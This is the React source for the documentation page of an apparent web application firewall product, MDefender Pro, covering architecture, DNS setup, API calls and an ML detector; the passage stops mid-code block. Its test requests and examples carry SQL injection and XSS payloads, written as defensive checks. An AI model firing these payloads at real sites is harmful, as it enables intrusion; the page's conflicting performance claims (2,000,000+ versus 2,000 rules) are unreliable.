import { useState, useMemo } from 'react'
import { Link } from 'react-router-dom'
import { useTheme } from '../contexts/ThemeContext'
import PublicNavbar from '../components/PublicNavbar'
import Docs3DArchitecture from '../components/Docs3DArchitecture'
import copyToClipboard from '../utils/clipboard'

const docSections = [
  {
    group: 'Getting Started',
    items: [
      { id: 'intro', label: 'What is MDefender Pro', icon: 'fa-shield-halved' },
      { id: 'hybrid-architecture', label: 'Hybrid WAF + ML Engine', icon: 'fa-network-wired' },
      { id: 'quickstart', label: '5-Minute Quickstart', icon: 'fa-bolt' },
      { id: 'website-connect', label: 'Connect Website Guide', icon: 'fa-plug-circle-bolt' }
    ]
  },
  {
    group: '6,501,208+ Dataset ML Core',
    items: [
      { id: 'ml-overview', label: 'Machine Learning Model', icon: 'fa-microchip' },
      { id: 'ml-vectorizer', label: 'Character N-Gram Vectorizer', icon: 'fa-cubes-stacked' },
      { id: 'ml-classification', label: 'Risk Scoring & Categories', icon: 'fa-gauge-high' }
    ]
  },
  {
    group: '2,000,000+ Hyper-Scale Signatures',
    items: [
      { id: 'rules-overview', label: 'Signatures Overview', icon: 'fa-list-check' },
      { id: 'sqli-defense', label: 'SQL Injection (400k+ Vectors)', icon: 'fa-database' },
      { id: 'xss-defense', label: 'Cross-Site Scripting (350k+ Vectors)', icon: 'fa-code' },
      { id: 'rce-webshells', label: 'RCE & WebShells (300k+ Vectors)', icon: 'fa-terminal' },
      { id: 'lfi-traversal', label: 'LFI & Traversal (200k+ Vectors)', icon: 'fa-folder-open' },
      { id: 'cms-vulnerabilities', label: 'CMS Exploits (250k+ Vectors)', icon: 'fa-file-shield' },
      { id: 'bots-scanners', label: 'Bots & Scanners (150k+ Vectors)', icon: 'fa-robot' },
      { id: 'ssrf-xxe', label: 'SSRF & Cloud IMDS (150k+ Vectors)', icon: 'fa-cloud' }
    ]
  },

  {
    group: 'Cloud WAF & Integration',
    items: [
      { id: 'cloud-waf', label: 'Cloud WAF (Smart Anycast DNS)', icon: 'fa-cloud' },
      { id: 'sdk-wordpress', label: 'WordPress Official Plugin', icon: 'fa-wordpress' },
      { id: 'nginx-proxy', label: 'NGINX & Reverse Proxy Gateway', icon: 'fa-server' },
      { id: 'sdk-python', label: 'Python / FastAPI / Django', icon: 'fa-python' },
      { id: 'sdk-php', label: 'PHP / Laravel', icon: 'fa-php' }
    ]
  },
  {
    group: 'Custom Rules Builder',
    items: [
      { id: 'custom-rules-guide', label: 'Authoring Regex Policies', icon: 'fa-sliders' },
      { id: 'tenant-isolation', label: 'Tenant Isolation & Policy Actions', icon: 'fa-lock' }
    ]
  },
  {
    group: 'REST API Reference',
    items: [
      { id: 'api-auth', label: 'Authentication Endpoints', icon: 'fa-key' },
      { id: 'api-rules', label: 'Custom Rules CRUD API', icon: 'fa-gears' },
      { id: 'api-telemetry', label: 'Logs & Metrics Streams', icon: 'fa-chart-line' }
    ]
  },
  {
    group: 'Operations & Compliance',
    items: [
      { id: 'learning-lab', label: 'Attack Learning Lab & Retraining', icon: 'fa-brain' },
      { id: 'benchmarks', label: 'Latency & Benchmarks', icon: 'fa-stopwatch' },
      { id: 'compliance', label: 'SOC 2 & GDPR Privacy', icon: 'fa-certificate' },
      { id: 'faqs', label: 'Frequently Asked Questions', icon: 'fa-circle-question' }
    ]
  }
]

function CodeBlock({ code, language = 'javascript' }) {
  const [copied, setCopied] = useState(false)
  const handleCopy = async () => {
    const ok = await copyToClipboard(code)
    if (ok) {
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  return (
    <div
      className="card-3d-interactive"
      style={{
        borderRadius: '12px',
        overflow: 'hidden',
        margin: '20px 0',
        background: '#040711',
        border: '1px solid rgba(59, 130, 246, 0.3)',
        boxShadow: '0 12px 30px rgba(0,0,0,0.5), 0 0 20px rgba(37, 99, 235, 0.1)',
        position: 'relative'
      }}
    >
      <div style={{
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        padding: '10px 16px',
        background: '#070c18',
        borderBottom: '1px solid rgba(255, 255, 255, 0.08)',
        fontSize: '11px',
        color: '#94a3b8',
        fontFamily: 'monospace'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span style={{ width: '8px', height: '8px', borderRadius: '50%', background: '#ef4444' }}></span>
          <span style={{ width: '8px', height: '8px', borderRadius: '50%', background: '#f59e0b' }}></span>
          <span style={{ width: '8px', height: '8px', borderRadius: '50%', background: '#10b981' }}></span>
          <span style={{ marginLeft: '6px', color: '#38bdf8', fontWeight: 'bold' }}>{language.toUpperCase()}</span>
        </div>
        <button
          onClick={handleCopy}
          style={{
            background: 'rgba(255,255,255,0.06)',
            border: '1px solid rgba(255,255,255,0.1)',
            borderRadius: '6px',
            padding: '3px 10px',
            color: copied ? '#10b981' : '#cbd5e1',
            cursor: 'pointer',
            fontSize: '11px',
            display: 'flex',
            alignItems: 'center',
            gap: '6px',
            transition: 'all 0.2s'
          }}
        >
          <i className={`fas ${copied ? 'fa-check' : 'fa-copy'}`}></i>
          {copied ? 'Copied' : 'Copy Code'}
        </button>
      </div>
      <pre style={{
        margin: 0,
        padding: '20px',
        color: '#e2e8f0',
        fontSize: '13px',
        lineHeight: '1.65',
        fontFamily: "'SF Mono', Monaco, 'Cascadia Code', monospace",
        overflowX: 'auto'
      }}>
        <code>{code}</code>
      </pre>
    </div>
  )
}

function MethodBadge({ method }) {
  const colors = {
    GET: { bg: 'rgba(37,99,235,0.15)', color: '#60a5fa', border: '#2563eb' },
    POST: { bg: 'rgba(16,185,129,0.15)', color: '#34d399', border: '#059669' },
    PUT: { bg: 'rgba(245,158,11,0.15)', color: '#fbbf24', border: '#d97706' },
    DELETE: { bg: 'rgba(239,68,68,0.15)', color: '#f87171', border: '#dc2626' }
  }
  const c = colors[method] || colors.GET
  return (
    <span style={{
      display: 'inline-block',
      padding: '2px 8px',
      borderRadius: '4px',
      fontSize: '11px',
      fontWeight: '800',
      fontFamily: 'monospace',
      backgroundColor: c.bg,
      color: c.color,
      border: `1px solid ${c.border}`,
      marginRight: '8px'
    }}>
      {method}
    </span>
  )
}

export default function Docs() {
  const { dark } = useTheme()
  const [activeSection, setActiveSection] = useState('intro')
  const [searchFilter, setSearchFilter] = useState('')

  const filteredDocSections = useMemo(() => {
    if (!searchFilter.trim()) return docSections
    const q = searchFilter.toLowerCase()
    return docSections
      .map(group => ({
        ...group,
        items: group.items.filter(item => item.label.toLowerCase().includes(q))
      }))
      .filter(group => group.items.length > 0)
  }, [searchFilter])

  // Design Tokens for Crisp Light and Cyber Dark Modes
  const t = {
    bg: dark ? '#070b14' : '#f8fafc',
    sidebarBg: dark ? '#0a0e1a' : '#ffffff',
    sidebarBorder: dark ? '1px solid #1e293b' : '1px solid #e2e8f0',
    heading: dark ? '#ffffff' : '#0f172a',
    subheading: dark ? '#f8fafc' : '#1e293b',
    body: dark ? '#cbd5e1' : '#334155',
    muted: dark ? '#94a3b8' : '#64748b',
    cardBg: dark ? '#0c1222' : '#ffffff',
    cardBgAlt: dark ? '#0a0f1d' : '#ffffff',
    cardBorder: dark ? '1px solid #1e293b' : '1px solid #e2e8f0',
    cardBorderAlt: dark ? '1px solid #334155' : '1px solid #cbd5e1',
    cardShadow: dark ? 'none' : '0 4px 20px -2px rgba(0,0,0,0.05)',
    cardGrad: dark
      ? 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))'
      : '#ffffff',
    searchBg: dark ? '#070b14' : '#f1f5f9',
    searchBorder: dark ? '1px solid #1e293b' : '1px solid #cbd5e1',
    searchText: dark ? '#e2e8f0' : '#0f172a',
    tableHeadBg: dark ? '#0c1222' : '#f1f5f9',
    tableBorder: dark ? '#1e293b' : '#e2e8f0',
    accentText: dark ? '#38bdf8' : '#0284c7',
    primaryGrad: 'linear-gradient(135deg, #2563eb, #7c3aed)'
  }

  return (
    <div style={{
      minHeight: '100vh',
      background: t.bg,
      color: t.body,
      fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif"
    }}>
      <style>{`
        .doc-inline-code {
          background: ${dark ? 'rgba(255,255,255,0.08)' : '#e2e8f0'};
          color: ${dark ? '#38bdf8' : '#0284c7'};
          padding: 2px 6px;
          border-radius: 4px;
          font-family: 'SF Mono', Monaco, monospace;
          font-size: 0.9em;
        }
      `}</style>
      <PublicNavbar />

      <div style={{
        maxWidth: '1440px',
        margin: '0 auto',
        display: 'flex',
        minHeight: 'calc(100vh - 70px)'
      }}>
        {/* Left Navigation Sidebar */}
        <aside style={{
          width: '310px',
          flexShrink: 0,
          borderRight: t.sidebarBorder,
          background: t.sidebarBg,
          padding: '28px 20px',
          position: 'sticky',
          top: '70px',
          height: 'calc(100vh - 70px)',
          overflowY: 'auto'
        }}>
          {/* Search Box */}
          <div style={{ position: 'relative', marginBottom: '24px' }}>
            <i className="fas fa-search" style={{
              position: 'absolute',
              left: '12px',
              top: '50%',
              transform: 'translateY(-50%)',
              color: '#64748b',
              fontSize: '12px'
            }}></i>
            <input
              type="text"
              placeholder="Search documentation..."
              value={searchFilter}
              onChange={e => setSearchFilter(e.target.value)}
              style={{
                width: '100%',
                padding: '8px 12px 8px 34px',
                borderRadius: '8px',
                border: t.searchBorder,
                background: t.searchBg,
                color: t.searchText,
                fontSize: '13px',
                outline: 'none'
              }}
            />
          </div>

          {/* Nav Group List */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
            {filteredDocSections.map((group, idx) => (
              <div key={idx}>
                <div style={{
                  fontSize: '11px',
                  fontWeight: '700',
                  color: t.muted,
                  textTransform: 'uppercase',
                  letterSpacing: '0.05em',
                  marginBottom: '8px',
                  paddingLeft: '8px'
                }}>
                  {group.group}
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '2px' }}>
                  {group.items.map(item => (
                    <button
                      key={item.id}
                      onClick={() => setActiveSection(item.id)}
                      style={{
                        padding: '7px 10px',
                        borderRadius: '6px',
                        border: 'none',
                        background: activeSection === item.id ? (dark ? 'rgba(37,99,235,0.15)' : 'rgba(37,99,235,0.1)') : 'transparent',
                        color: activeSection === item.id ? (dark ? '#60a5fa' : '#2563eb') : t.muted,
                        fontWeight: activeSection === item.id ? '700' : '500',
                        fontSize: '13px',
                        cursor: 'pointer',
                        textAlign: 'left',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '8px',
                        transition: 'all 0.15s'
                      }}
                    >
                      <i className={`fas ${item.icon}`} style={{ width: '16px', textAlign: 'center', color: activeSection === item.id ? (dark ? '#38bdf8' : '#2563eb') : '#64748b' }}></i>
                      {item.label}
                    </button>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </aside>

        {/* Right Content Pane */}
        <main style={{
          flex: 1,
          padding: '40px 48px 100px',
          maxWidth: '1020px',
          overflowY: 'auto'
        }}>
          {/* Breadcrumb Header */}
          <div style={{ fontSize: '13px', color: '#64748b', marginBottom: '14px', display: 'flex', alignItems: 'center', gap: '6px' }}>
            <span>Docs</span>
            <i className="fas fa-chevron-right" style={{ fontSize: '10px' }}></i>
            <span style={{ color: t.accentText, fontWeight: '600' }}>
              {docSections.flatMap(g => g.items).find(i => i.id === activeSection)?.label || 'Overview'}
            </span>
          </div>

          {/* Section: Intro */}
          {activeSection === 'intro' && (
            <div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>What is MDefender Pro?</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                <strong>MDefender Pro</strong> is an enterprise-grade, hybrid Web Application Firewall (WAF) and real-time API protection suite. It combines a deterministic catalog of <strong>2,000 verified WAF signature rules</strong> with a state-of-the-art <strong>Machine Learning model trained on 6,501,208+ real-world attack vectors</strong> (and 639K+ Generative AI prompt injections) to safeguard applications against OWASP Top 10 vulnerabilities, zero-day payloads, and bot scrapers with 0.12ms execution.
              </p>

              <div style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))',
                gap: '16px',
                margin: '28px 0'
              }}>
                <div className="card-3d-interactive" style={{ padding: '24px', borderRadius: '14px', background: t.cardBg, border: t.cardBorder, boxShadow: t.cardShadow, position: 'relative' }}>
                  <div className="hud-corner hud-corner-tl" style={{ borderColor: t.accentText }}></div>
                  <div className="hud-corner hud-corner-br" style={{ borderColor: t.accentText }}></div>
                  <div style={{ color: t.accentText, fontWeight: '800', fontSize: '15px', marginBottom: '8px' }}>
                    <i className="fas fa-microchip" style={{ marginRight: '8px' }}></i> 6,501,208+ Dataset ML Model
                  </div>
                  <p style={{ fontSize: '13px', color: t.muted, margin: 0, lineHeight: '1.6' }}>
                    Trained across CSIC HTTP, CICIDS, and 639K+ AI jailbreak corpora using character n-gram TF-IDF vectorization (99.23% precision).
                  </p>
                </div>

                <div className="card-3d-interactive" style={{ padding: '24px', borderRadius: '14px', background: t.cardBg, border: t.cardBorder, boxShadow: t.cardShadow, position: 'relative' }}>
                  <div className="hud-corner hud-corner-tl" style={{ borderColor: '#60a5fa' }}></div>
                  <div className="hud-corner hud-corner-br" style={{ borderColor: '#60a5fa' }}></div>
                  <div style={{ color: dark ? '#60a5fa' : '#2563eb', fontWeight: '800', fontSize: '15px', marginBottom: '8px' }}>
                    <i className="fas fa-shield-halved" style={{ marginRight: '8px' }}></i> 2,000 WAF Rules
                  </div>
                  <p style={{ fontSize: '13px', color: t.muted, margin: 0, lineHeight: '1.6' }}>
                    Exhaustive regex catalog covering SQLi, XSS, RCE, LFI, CMS exploits, and scanner bots.
                  </p>
                </div>

                <div className="card-3d-interactive" style={{ padding: '24px', borderRadius: '14px', background: t.cardBg, border: t.cardBorder, boxShadow: t.cardShadow, position: 'relative' }}>
                  <div className="hud-corner hud-corner-tl" style={{ borderColor: '#10b981' }}></div>
                  <div className="hud-corner hud-corner-br" style={{ borderColor: '#10b981' }}></div>
                  <div style={{ color: '#10b981', fontWeight: '800', fontSize: '15px', marginBottom: '8px' }}>
                    <i className="fas fa-bolt" style={{ marginRight: '8px' }}></i> &lt; 0.12ms Latency
                  </div>
                  <p style={{ fontSize: '13px', color: t.muted, margin: 0, lineHeight: '1.6' }}>
                    Pre-compiled in-memory lookup table and low-overhead SGD inference guarantee zero application lag.
                  </p>
                </div>
              </div>

              {/* 3D Interactive Pipeline Architecture Diagram */}
              <Docs3DArchitecture />
            </div>
          )}

          {/* Section: Hybrid Architecture */}
          {activeSection === 'hybrid-architecture' && (
            <div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Hybrid WAF + ML Architecture</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '20px' }}>
                MDefender employs a multi-tiered pipeline that executes deterministic rule checks alongside statistical machine learning classification:
              </p>

              <div style={{
                background: t.cardBgAlt,
                border: t.cardBorder,
                borderRadius: '12px',
                padding: '28px',
                boxShadow: t.cardShadow,
                margin: '24px 0'
              }}>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '18px' }}>
                  <div style={{ display: 'flex', gap: '16px', alignItems: 'flex-start' }}>
                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(37,99,235,0.15)', color: '#2563eb', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>1</span>
                    <div>
                      <strong style={{ fontSize: '15px', color: t.heading }}>Request Extraction &amp; Recursive Normalization</strong>
                      <p style={{ fontSize: '13px', color: t.muted, marginTop: '4px', lineHeight: '1.6' }}>
                        Extracts URL path, query string, request headers (User-Agent, Referer, Cookies), and multipart/JSON body fields. Executes double URL unquoting to prevent multi-layered encoding evasion.
                      </p>
                    </div>
                  </div>

                  <div style={{ display: 'flex', gap: '16px', alignItems: 'flex-start' }}>
                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(37,99,235,0.15)', color: '#2563eb', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>2</span>
                    <div>
                      <strong style={{ fontSize: '15px', color: t.heading }}>Tier 1: 2,000 Compiled Regex Rules (0.12ms)</strong>
                      <p style={{ fontSize: '13px', color: t.muted, marginTop: '4px', lineHeight: '1.6' }}>
                        Evaluates pre-compiled regular expressions for known signatures. Also appends custom user-defined tenant rules dynamically.
                      </p>
                    </div>
                  </div>

                  <div style={{ display: 'flex', gap: '16px', alignItems: 'flex-start' }}>
                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(139,92,246,0.15)', color: '#7c3aed', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>3</span>
                    <div>
                      <strong style={{ fontSize: '15px', color: t.heading }}>Tier 2: 6,501,208+ Dataset ML Inference Classifier (0.12ms)</strong>
                      <p style={{ fontSize: '13px', color: t.muted, marginTop: '4px', lineHeight: '1.6' }}>
                        Vectorizes text into character n-grams and evaluates against the trained linear SGD / logistic model, outputting probability confidence and attack category.
                      </p>
                    </div>
                  </div>

                  <div style={{ display: 'flex', gap: '16px', alignItems: 'flex-start' }}>
                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(16,185,129,0.15)', color: '#059669', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>4</span>
                    <div>
                      <strong style={{ fontSize: '15px', color: t.heading }}>Decision Engine &amp; Threat Termination</strong>
                      <p style={{ fontSize: '13px', color: t.muted, marginTop: '4px', lineHeight: '1.6' }}>
                        If confidence exceeds threshold or a rule is matched, the engine returns an immediate <code className="doc-inline-code">HTTP 403 Forbidden</code>, flags the attacking IP, and streams live telemetry to the user dashboard.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Section: Website Connect & 5-Minute Quickstart */}
          {(activeSection === 'website-connect' || activeSection === 'quickstart') && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(56, 189, 248, 0.15)',
                  border: '1px solid rgba(56, 189, 248, 0.3)',
                  color: t.accentText,
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Integration Guide</span>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.3)',
                  color: '#059669',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Zero Config &bull; 1-Line Script &bull; Bundled 403 Page</span>
              </div>

              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>
                How to Connect Your Website with MDefender
              </h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '28px' }}>
                Integrate MDefender Pro into any website in minutes &mdash; without writing complex server code. Choose from Cloudflare-style Smart Anycast DNS delegation, CNAME proxy routing, or the official WordPress security plugin.
              </p>

              {/* Method 1: Cloud Anycast Reverse Proxy (Cloudflare-Style Smart DNS) */}
              <div style={{
                background: 'linear-gradient(135deg, rgba(245, 158, 11, 0.08), rgba(234, 88, 12, 0.08))',
                border: '1px solid rgba(245, 158, 11, 0.35)',
                borderRadius: '16px',
                padding: '24px',
                boxShadow: t.cardShadow,
                marginBottom: '24px'
              }}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '8px', marginBottom: '10px' }}>
                  <h3 style={{ fontSize: '18px', fontWeight: '800', color: dark ? '#fbbf24' : '#b45309', margin: 0 }}>
                    <i className="fa-solid fa-cloud" style={{ color: '#f59e0b', marginRight: '10px' }}></i>
                    Method 1 (Recommended): Cloud Anycast Reverse Proxy (Zero Code • All Platforms)
                  </h3>
                  <span style={{ padding: '3px 10px', background: '#f59e0b', color: '#fff', fontSize: '11px', fontWeight: '700', borderRadius: '6px' }}>Cloudflare-Style</span>
                </div>
                <p style={{ fontSize: '13px', color: t.body, lineHeight: '1.6', marginBottom: '14px' }}>
                  Protect any website running on <strong>Vercel, AWS, Render, Netlify, cPanel, VPS, React, Next.js, Node.js, Laravel, or Python</strong> without writing a single line of code. Simply update your domain DNS records:
                </p>

                <div style={{
                  background: dark ? '#0b1329' : '#f8fafc',
                  border: '1px solid #334155',
                  borderRadius: '12px',
                  padding: '16px 20px',
                  marginBottom: '16px',
                  fontFamily: 'monospace',
                  fontSize: '13px'
                }}>
                  <div style={{ color: '#38bdf8', fontWeight: '700', marginBottom: '8px' }}>// Set Nameservers at your Domain Registrar (Namecheap, GoDaddy, etc.):</div>
                  <div style={{ color: '#22c55e' }}>NS1: ns1.mdefender.pro</div>
                  <div style={{ color: '#22c55e' }}>NS2: ns2.mdefender.pro</div>
                  <div style={{ marginTop: '10px', color: '#94a3b8' }}>// Or point CNAME record to:</div>
                  <div style={{ color: '#f59e0b' }}>CNAME: proxy.mdefender.pro</div>
                </div>

                <div style={{
                  background: dark ? 'rgba(16, 185, 129, 0.1)' : 'rgba(16, 185, 129, 0.08)',
                  border: '1px solid rgba(16, 185, 129, 0.25)',
                  borderRadius: '8px',
                  padding: '12px 14px',
                  fontSize: '12.5px',
                  color: dark ? '#6ee7b7' : '#047857'
                }}>
                  <i className="fa-solid fa-check-circle" style={{ marginRight: '6px' }}></i>
                  <strong>Sub-Millisecond Edge WAF:</strong> Once DNS is pointed, all incoming traffic is inspected in ~0.35ms before reaching your origin server. DDoS attacks, SQLi, and 0-days are blocked instantly.
                </div>
              </div>

              {/* Method 2: WordPress Security Plugin */}
              <div style={{
                background: t.cardGrad,
                border: t.cardBorder,
                borderRadius: '16px',
                padding: '24px',
                boxShadow: t.cardShadow,
                marginBottom: '24px'
              }}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '8px', marginBottom: '10px' }}>
                  <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, margin: 0 }}>
                    <i className="fa-brands fa-wordpress" style={{ color: '#0284c7', marginRight: '10px' }}></i>
                    Method 2: MDefender Pro WordPress Security Plugin
                  </h3>
                  <span style={{ padding: '3px 10px', background: '#0284c7', color: '#fff', fontSize: '11px', fontWeight: '700', borderRadius: '6px' }}>Deep Scan</span>
                </div>
                <p style={{ fontSize: '13px', color: t.muted, lineHeight: '1.6', marginBottom: '14px' }}>
                  For WordPress sites, the official plugin provides deep internal protection including core integrity checks, webshell hunting, and file modification scanners.
                </p>

                <ol style={{ fontSize: '13px', color: t.body, lineHeight: '1.8', paddingLeft: '20px', margin: '0 0 16px' }}>
                  <li>Download <strong>mdefender-pro.zip</strong> directly from your MDefender Pro dashboard.</li>
                  <li>In your WordPress Admin, go to <strong>Plugins &rarr; Add New &rarr; Upload Plugin</strong> and activate it.</li>
                  <li>Open <strong>MDefender Pro</strong> in the sidebar, paste your scoped API key, and click <strong>Connect</strong>.</li>
                  <li>Real-time attack telemetry and file scanners begin immediately.</li>
                </ol>
              </div>

              {/* Method 3: REST API Gateway */}
              <div style={{
                background: t.cardGrad,
                border: t.cardBorder,
                borderRadius: '16px',
                padding: '24px',
                boxShadow: t.cardShadow,
                marginBottom: '24px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '12px' }}>
                  <i className="fa-solid fa-code" style={{ color: t.accentText, marginRight: '10px' }}></i>
                  Method 3: Direct REST API Integration (Custom Gateways)
                </h3>
                <p style={{ fontSize: '13px', color: t.muted, marginBottom: '12px' }}>
                  Call MDefender's high-speed decision engine from your reverse proxy, NGINX Lua, or backend gateway:
                </p>
                <CodeBlock
                  language="bash"
                  code={`curl -X POST "https://api.mdefender.pro/api/v1/waf/analyze" \\
  -H "Content-Type: application/json" \\
  -d '{
    "api_key": "YOUR_SCOPED_API_KEY",
    "ip": "203.0.113.42",
    "method": "POST",
    "path": "/wp-login.php",
    "query": "id=1'\'' OR 1=1--",
    "headers": {"User-Agent": "Mozilla/5.0"}
  }'`}
                />
              </div>

              {/* Edge Architecture Explanation */}
              <div style={{
                background: t.cardBgAlt,
                border: t.cardBorder,
                borderRadius: '16px',
                padding: '24px',
                boxShadow: t.cardShadow,
                marginBottom: '24px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '14px' }}>
                  <i className="fa-solid fa-network-wired" style={{ color: '#7c3aed', marginRight: '8px' }}></i>
                  How Cloud WAF Edge Filtering Protects Your Origin Server
                </h3>
                <p style={{ fontSize: '13px', color: t.muted, marginBottom: '16px', lineHeight: '1.6' }}>
                  When traffic routes through MDefender Anycast Edge (DNS / CNAME Proxy):
                </p>

                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px' }}>
                  <div style={{ background: dark ? '#0f172a' : '#f8fafc', padding: '16px', borderRadius: '10px', border: t.cardBorder }}>
                    <h4 style={{ color: '#ef4444', margin: '0 0 8px', fontSize: '14px', fontWeight: '700' }}>
                      <i className="fa-solid fa-ban" style={{ marginRight: '6px' }}></i>
                      Malicious Requests Terminated at Edge (&lt; 0.35ms)
                    </h4>
                    <p style={{ fontSize: '12.5px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
                      When a malicious request is sent (e.g. SQL injection, XSS payload, or webshell upload), MDefender Cloud terminates the connection at the edge, logs the attacker IP, and serves the high-security <strong>403 Forbidden Block Page</strong>. Your origin server never sees the attack.
                    </p>
                  </div>

                  <div style={{ background: dark ? '#0f172a' : '#f8fafc', padding: '16px', borderRadius: '10px', border: t.cardBorder }}>
                    <h4 style={{ color: '#059669', margin: '0 0 8px', fontSize: '14px', fontWeight: '700' }}>
                      <i className="fa-solid fa-check" style={{ marginRight: '6px' }}></i>
                      Clean Traffic Forwarded to Origin
                    </h4>
                    <p style={{ fontSize: '12.5px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
                      Legitimate visitors pass through seamlessly with sub-millisecond overhead. Origin server resources remain safe, protected, and fast.
                    </p>
                  </div>
                </div>
              </div>

              {/* Test and Verify Active Protection */}
              <div style={{
                background: t.cardGrad,
                border: t.cardBorder,
                borderRadius: '16px',
                padding: '24px',
                boxShadow: t.cardShadow
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '12px' }}>
                  <i className="fa-solid fa-flask" style={{ color: '#059669', marginRight: '10px' }}></i>
                  Test and Verify Active Protection
                </h3>
                <p style={{ fontSize: '13px', color: t.muted, marginBottom: '12px' }}>
                  Execute these test requests in your terminal or browser:
                </p>
                <CodeBlock
                  language="bash"
                  code={`# 1. Test XSS Attack (Expect 403 Forbidden & Cyber Block Page)
curl -i "https://yourdomain.com/?q=%3Cscript%3Ealert(1)%3C/script%3E"

# 2. Test SQL Injection (Expect 403 Forbidden & Cyber Block Page)
curl -i "https://yourdomain.com/?search=%27%20UNION%20SELECT%20null,password%20FROM%20users--"

# 3. Test Safe Query (Expect 200 OK with normal website response)
curl -i "https://yourdomain.com/"`}
                />
              </div>
            </div>
          )}

          {/* Section: ML Overview */}
          {activeSection === 'ml-overview' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: t.accentText, fontSize: '12px', fontWeight: '700' }}>AI Core</span>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#059669', fontSize: '12px', fontWeight: '700' }}>6,501,208+ Training Samples</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>The 6,501,208+ Dataset Machine Learning Core</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                MDefender Pro's Machine Learning core is engineered to stop polymorphic payloads, zero-day CVE exploits, and 639K+ Generative AI prompt injection attacks that evade traditional static signatures.
              </p>

              <div style={{
                background: t.cardBg,
                border: t.cardBorder,
                borderRadius: '12px',
                padding: '24px',
                boxShadow: t.cardShadow,
                margin: '24px 0'
              }}>
                <h3 style={{ fontSize: '17px', fontWeight: '700', marginBottom: '12px', color: t.accentText }}>Training Corpus &amp; Dataset Highlights:</h3>
                <ul style={{ paddingLeft: '20px', fontSize: '13px', lineHeight: '1.8', color: t.muted }}>
                  <li><strong>6,501,208+ Sample Corpus:</strong> Combines HTTP traffic corpora from CSIC 2010, CICIDS2017, OWASP ModSecurity Core Rule Set vectors, 639,536 Generative AI Jailbreaks, and real-world honeypot captures.</li>
                  <li><strong>Character N-Gram Vectorizer:</strong> Analyzes 3-gram to 5-gram token distributions to capture structural syntactic patterns rather than relying on exact keyword substrings.</li>
                  <li><strong>Dual Classifier Output:</strong> Generates a binary attack probability (0.0 to 1.0) and a multi-class threat classifier (SQLi, XSS, RCE, LFI, SSRF, Deserialization, AI Prompt Injection).</li>
                  <li><strong>Inference Speed:</strong> Optimized via scikit-learn SGDClassifier / joblib serialization to execute inference in less than 0.12ms at 99.23% ML precision.</li>
                </ul>
              </div>

              <h3 style={{ fontSize: '18px', fontWeight: '700', marginTop: '30px', marginBottom: '12px', color: t.subheading }}>ML Detector Python API</h3>
              <CodeBlock
                language="python"
                code={`from src.engine.ml_detector import MLDetector

detector = MLDetector()

# Analyze an incoming request payload
result = detector.detect("UNION SELECT password FROM users --")
print(result)

# Output:
# {
#   "attack": True,
#   "prediction": 1,
#   "probability": 0.9984,
#   "category": "SQL Injection",
#   "confidence": 0.9984,
